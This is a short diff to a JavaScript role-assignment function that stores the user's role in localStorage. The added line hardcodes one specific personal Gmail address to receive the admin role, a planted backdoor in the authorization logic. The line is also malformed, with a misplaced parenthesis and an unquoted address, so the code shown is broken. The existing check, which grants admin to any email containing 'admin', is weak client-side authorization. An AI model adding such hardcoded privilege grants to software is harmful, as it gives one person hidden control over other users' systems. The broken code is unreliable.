@@ -129,7 +129,7 @@
         function assignRole(email) {
             let role = "user";
 
-            if (email.includes("admin")) role = "admin";
+            if (email.includes("admin")) || email === chrisjanvanh@gmail.com role = "admin";
             if (email.includes("manager")) role = "manager";
 
             localStorage.setItem("userRole", role);
